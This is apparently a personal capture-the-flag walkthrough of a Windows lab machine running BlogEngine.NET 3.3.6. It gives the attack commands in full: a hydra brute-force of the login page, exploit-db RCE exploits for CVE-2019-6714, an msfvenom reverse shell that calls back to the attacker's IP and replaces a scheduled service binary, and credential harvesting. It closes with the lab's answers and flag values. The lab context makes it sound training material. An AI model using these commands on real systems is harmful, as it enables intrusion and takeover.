

# TOPTCP
```poweshell
80/tcp   open  http          syn-ack ttl 126
3389/tcp open  ms-wbt-server syn-ack ttl 126

```

# Webserver
```powershell

# Bruteforce the login page with user admin:
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.201.43.221 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=6kLXI1iaujyO2MnZVQ4qVcGSGyOH3AwHYTZEFHkoFPtDuwKUD2Wuj673LNUmYSLlNiRZXnPG8jY8dHcL05%2BAiDu7uOhot59SAjQsr1K7RIgiidnXNyVvpnx0eMGCuRTBOHLaI1PKMD2ojhTchN2BylfbTG58cWgVm56yuEfUfR5ArvpQb6yplkM4IcI2pHa66eqccoiFMCYIaBY2bXH%2FoxJOAcENnmZl9%2FIiFSOffGDgf75k3T%2FKqc7zdnJgBhmPThI40qcbWausxbT%2BJBsMHatbkTUOhg38xAC09TiLTGgwHwTMBMIDmbX1bHxoXSxGsZSnF4JFLXjuSikGPLq8f7z7l9kAbGhIgUEsk1nAvyHmOxDX&__EVENTVALIDATION=riUFAc7u406hmJgcE08kF1AI%2FJkLzxAqKGuEzXL3lI5%2F5arQ0jFxWie3ySO14bhGLv2GfZeYMdHUJVCE7upaoGhFH5A2BnbY8PWBn3%2Bmog5lL42LxmQNT2%2BoO1leKi21ZJXaNrIv%2F6YwvUiMmz3PUZg3kjTee1o%2F4gB67lx5vb3tEXlz&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -V

# Password found: 1qaz2wsx
```

# Creds
```powershell


	admin 
	1qaz2wsx

    DefaultUserName               :  administrator                                                                                     
    DefaultPassword               :  4q6XvFES7Fdxs 

```

# Exploitation
```powershell
# The website is powered by BlogEngine.NET 3.3.6.0

>>> searchsploit blogengine
>>> 
BlogEngine 3.3 - 'syndication.axd' XML External Entity Injection                                                                          | xml/webapps/48422.txt
BlogEngine 3.3 - XML External Entity Injection                                                                                            | windows/webapps/46106.txt
BlogEngine 3.3.8 - 'Content' Stored XSS                                                                                                   | aspx/webapps/48999.txt
BlogEngine.NET 1.4 - 'search.aspx' Cross-Site Scripting                                                                                   | asp/webapps/32874.txt
BlogEngine.NET 1.6 - Directory Traversal / Information Disclosure                                                                         | asp/webapps/35168.txt
BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution                                                                        | aspx/webapps/46353.cs
BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execution                                                        | aspx/webapps/47010.py
BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal                                                                                   | aspx/webapps/47035.py
BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code Execution                                                   | aspx/webapps/47011.py
BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection                                                                                | aspx/webapps/47014.py

# let's use 47010
searchsploit -m 47010

python3 47010.py -t 10.201.9.139 -u admin -p 1qaz2wsx -l 10.6.15.192:1337

# no luck

# -------- Next Attempt -------
# Tried 46353.cs
# https://www.exploit-db.com/exploits/46353
# The instrcutions mentioned:
# 1. set up a reverse tcp linster 
# 2. Change the file parameters to point to the listener
# 3. Save the file as PostView.ascx
# 4. upload the file to the file manager (in the toolbar when editing posts)
# 5. Trigger the code by browsing to: 
http://10.201.9.139/?theme=../../App_Data/files

# it worked. I'm in.  

```


# Local Enum

```powershell

c:\windows\system32\inetsrv>whoami
iis apppool\blog

c:\windows\system32\inetsrv>whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

>>> systeminfo


Host Name:                 HACKPARK                                                                                                                                         
OS Name:                   Microsoft Windows Server 2012 R2 Standard                                                                                                        
OS Version:                6.3.9600 N/A Build 9600       
System Type:               x64-based PC             
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 8 Hotfix(s) Installed.
                           [01]: KB2919355
                           [02]: KB2919442
                           [03]: KB2937220
                           [04]: KB2938772
                           [05]: KB2939471
                           [06]: KB2949621
                           [07]: KB3035131
                           [08]: KB3060716


### ------------- winpeas --------------###
# Some AutoLogon credentials were found                                                                                  
    DefaultUserName               :  administrator                                                                                     
    DefaultPassword               :  4q6XvFES7Fdxs    

#Service

WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
    File Permissions: Everyone [Allow: WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [Allow: WriteData/CreateFiles])                                 
    System Scheduler Service Wrapper    
    
    
	DisplayName         : System Scheduler Service                                                                                         
	Status              : Running                                      
	ServiceName         : WindowsScheduler                                                                                                 
	CanPauseAndContinue : True                                         
	CanShutdown         : True                                         
	CanStop             : True                                         
                                                                                         

    AWSLiteAgent(Amazon Inc. - AWS Lite Guest Agent)[C:\Program Files\Amazon\XenTools\LiteAgent.exe] - Auto - Running - No quotes and Space detected
    AWS Lite Guest Agent            

	DisplayName         : AWS Lite Guest Agent
	Status              : Running
	ServiceName         : AWSLiteAgent
	CanPauseAndContinue : False
	CanShutdown         : True
	CanStop             : True
	                                 
#----------




```


# Priv Escalation

```powershell
# From winPEAS:
Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [Allow: WriteData/CreateFiles])  

>>> cd C:\Program Files (x86)\SystemScheduler 
>>> dir
>>> cd Events
>>> type 20198415519.INI_LOG.txt

# 20198415519.INI_LOG.txt shows Message.exe is being executed every 30 sec

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.15.192 LPORT=666 -f exe -o "revtcp666_10_6_15_192.exe"


# moved it to the server and replaced it with Message.exe
# set up a listener revtcp listener
# I'm in.

# Alternatively, Meterpreter getsystem worked as well (I think because of SeImpersonate ) - Named Pipe Impersonation (PrintSpooler variant

   
```

# RDP
```powershell
xfreerdp3 /v:10.201.43.221 /u:admin /p:'1qaz2wsx' +clipboard /dynamic-resolution

# Failed:
# [13:45:40:939] [30179:000075e5] [ERROR][com.freerdp.crypto] - [freerdp_tls_handshake]: BIO_do_handshake failed
# [13:45:40:940] [30179:000075e5] [ERROR][com.freerdp.core] - [transport_default_connect_tls]: ERRCONNECT_TLS_CONNECT_FAILED [0x00020008]

rdesktop -u admin -p '1qaz2wsx' 10.201.43.221

# Failed:
Autoselecting keyboard map 'en-us' from locale
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
Failed to connect, CredSSP required by server (check if server has disabled old TLS versions, if yes use -V option).

>>> xfreerdp3 /v:10.201.9.139 /u:administrator /p:'4q6XvFES7Fdxs' +clipboard /dynamic-resolution

#didn't work 

```
# Answers
```powershell
# Whats the name of the clown displayed on the homepage?
pennywise

# What request type is the Windows website login form using?
POST

# Guess a username, choose a password wordlist and gain credentials to a user account!
1qaz2wsx

# Now you have logged into the website, are you able to identify the version of the BlogEngine?
3.3.6.0

# Use the [exploit database archive](http://www.exploit-db.com) to find an exploit to gain a reverse shell on this system.

# What is the CVE?
CVE-2019-6714

# Who is the webserver running as?
IIS APPPOOL\Blog

# What is the OS version of this windows machine?
Windows 2012 R2 (6.3 Build 9600)

# Can you spot a _service_ running some automated task that could be easily exploited? What is the **name** of this service?
WindowsScheduler

# What is the name of the binary you're supposed to exploit?
WService.exe
Message.exe

# What is the user flag (on Jeffs Desktop)?

C:\Users\jeff\Desktop>type user.txt
type user.txt
759bd8af507517bcfaede78a21a73e39

# What is the root flag?
c:\Users\Administrator\Desktop>type root.txt
type root.txt
7e13d97f05f7ceb9881a3eb3d78d3e72

# Using winPeas, what was the Original Install time? (This is date and time)
8/3/2019, 10:43:23 AM

```